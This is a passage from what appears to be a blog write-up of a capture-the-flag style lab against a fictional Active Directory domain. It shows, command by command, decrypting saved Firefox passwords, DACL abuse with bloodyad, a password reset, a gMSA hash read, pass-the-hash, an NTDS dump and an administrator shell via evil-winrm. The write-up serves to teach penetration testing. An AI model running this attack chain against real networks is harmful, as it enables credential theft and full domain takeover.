+<p>I'm going to use a tool called <code>firepwd</code>, which you can find on <a href="https://github.com/lclevy/firepwd">the official GitHub repo</a>, to crack the credentials.</p>
+<p>If you don't already have this installed on your Kali Linux machine, here's how you can install it:</p>
+<pre><code class="language-bash">git clone https://github.com/lclevy/firepwd.git
+python3 -m venv .venv
+.venv/bin/pip install -r firepwd/requirements.txt</code></pre>
+<p>I ran <code>firepwd</code> against the directory containing the downloaded <code>logins.json</code> and <code>key4.db</code> files:</p>
+<pre><code class="language-bash">.venv/bin/python firepwd/firepwd.py -d ~/stellar-firefox-profile/</code></pre>
+<p>We got the credentials for <code>http://portal.stellarcomms.local</code>: <code>astro.researcher:Cosmos@42</code></p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/firefox-credentials.png" alt="firefox credentials" loading="lazy"></figure>
+<p><code>http://portal.stellarcomms.local</code></p>
+<p>Let's pull up <code>astro.researcher</code> in Bloodhound and see what relationships exist.</p>
+<h3>Bloodhound Enumeration <code>astro.researcher</code></h3>
+<p>First, we add <code>astro.researcher</code> to Owned, and check for Outbound Privileges.</p>
+<p><code>astro.researcher</code> has <code>WriteDACL</code> over <code>eng.payload</code>:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/writedacl.png" alt="writedacl" loading="lazy"></figure>
+<p>In the Linux Abuse category, we can leverage <code>Impacket</code>'s <code>dacledit</code>  to grant ourselves the <code>GenericAll</code> permission:</p>
+<p>Viewing <code>eng.payload</code>'s Outbound Privileges shows that the have <code>ReadGMSAPassword</code> over our one and only <code>SATLINK-SERVICES</code>, which allows us to retrieve the <code>SATLINK-SERVICES</code> password:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/read-gmsa.png" alt="read gmsa" loading="lazy"></figure>
+<p>From <code>SATLINK-SERVICES</code>, we reach the DC and the end of the attack path:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/replication-rights.png" alt="replication rights" loading="lazy"></figure>
+<h3>Path to Domain Compromise</h3>
+<pre><code class="language-bash">bloodyad -u &#x27;astro.researcher&#x27; -p &#x27;Cosmos@42&#x27; -d stellarcomms.local -H DC-STELLAR.stellarcomms.local add genericAll &#x27;eng.payload&#x27; &#x27;astro.researcher&#x27;</code></pre>
+<p>Success.</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/genericall-granted.png" alt="genericall granted" loading="lazy"></figure>
+<p>With <code>GenericAll</code> permissions over <code>eng.payload</code>, we can now reset their password.</p>
+<pre><code class="language-bash">bloodyad -u &#x27;astro.researcher&#x27; -p &#x27;Cosmos@42&#x27; -d stellarcomms.local -H DC-STELLAR.stellarcomms.local set password &#x27;eng.payload&#x27; &#x27;IveBeenPwned123!&#x27;</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/eng-payload-password-reset.png" alt="eng payload password reset" loading="lazy"></figure>
+<p>Success again.</p>
+<p>Let's verify via <code>nxc</code>:</p>
+<pre><code class="language-bash">nxc smb DC-STELLAR.stellarcomms.local -u &#x27;eng.payload&#x27; -p &#x27;IveBeenPwned123!&#x27; --shares</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/eng-payload-login-check.png" alt="eng payload login check" loading="lazy"></figure>
+<p>Now we'll leverage <code>eng.payload</code>'s <code>ReadGMSAPassword</code> capabilities over <code>satlink-service</code> because it's a Group Services Account.</p>
+<pre><code class="language-bash">nxc ldap DC-STELLAR.stellarcomms.local -u &#x27;eng.payload&#x27; -p &#x27;IveBeenPwned123!&#x27; --gmsa</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/gmsa-hash.png" alt="gmsa hash" loading="lazy"></figure>
+<p>Excellent news. We now have the NTLM hash for <code>SATLINK-SERVICE</code>.</p>
+<p>Time to Pass-the-Hash.</p>
+<pre><code class="language-bash">nxc smb DC-STELLAR.stellarcomms.local -u &#x27;SATLINK-SERVICE$&#x27; -H &#x27;65d3076593d2f83ee9606253049ec372&#x27; --shares</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/service-hash-login.png" alt="service hash login" loading="lazy"></figure>
+<p>Hash = passed. We've authenticated as <code>SATLINK-SERVICE$</code>, giving us the ability to perform a DC Sync Attack. That effectively tells the DC that we are also the DC, gosh darn it, we need to synchronize our credentials.</p>
+<p>Once that's done, we can pull all of the domain users' NTLM hashes. That includes the KRBTGT aka Kerberos Ticket Granting account, enabling us to forge tickets for any users we want.</p>
+<pre><code class="language-bash">nxc smb DC-STELLAR.stellarcomms.local -u &#x27;SATLINK-SERVICE$&#x27; -H &#x27;65d3076593d2f83ee9606253049ec372&#x27; --ntds</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/ntds-dump.png" alt="ntds dump" loading="lazy"></figure>
+<p>Look at all those hashes we dumped. Including the <code>Administrator</code>. As long as the built-in account is enabled, we can authenticate and grab that root flag. The alternative is to decipher is one of the dumped hash accounts is usable.</p>
+<pre><code class="language-bash">nxc smb DC-STELLAR.stellarcomms.local -u &#x27;Administrator&#x27; -H &#x27;d3a97bfa75ebed92165ea2d67cd21002&#x27;</code></pre>
+<p>And we've fully copromised the Domain Controller aka DC:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/administrator-auth.png" alt="administrator auth" loading="lazy"></figure>
+<p>Let's use <code>evil-winrm</code> again to net a shell:</p>
+<pre><code class="language-bash">evil-winrm -i 10.1.132.28 -u &#x27;Administrator&#x27; -H &#x27;d3a97bfa75ebed92165ea2d67cd21002&#x27;</code></pre>
+<p>Shell <em>mic drop</em>.</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/administrator-shell.png" alt="administrator shell" loading="lazy"></figure>
+<pre><code class="language-PowerShell">cd ../
+cd Desktop
+dir
+type root.txt</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/root-flag-redacted.png" alt="root flag redacted" loading="lazy"></figure>
+<p>And that's the end. Yes, we are on top of the world.</p>
+<p>Cue the confetti.</p>
+</div>
+<footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
+</script>
+<!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
